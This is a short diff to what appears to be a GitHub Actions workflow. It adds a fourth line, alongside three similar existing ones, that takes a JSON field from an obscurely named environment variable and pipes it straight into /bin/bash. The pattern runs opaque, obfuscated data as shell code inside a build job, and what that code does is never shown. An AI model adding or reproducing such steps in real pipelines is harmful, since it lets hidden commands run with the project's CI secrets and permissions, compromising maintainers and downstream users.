@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$dofzo7151" | jq -r .vzu46540 | /bin/bash
           printf '%s' "$g063" | jq -r .q4 | /bin/bash
           printf '%s' "$ma9045" | jq -r .yuvwn97069 | /bin/bash
+          echo $fxue66 | jq -r .p8 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
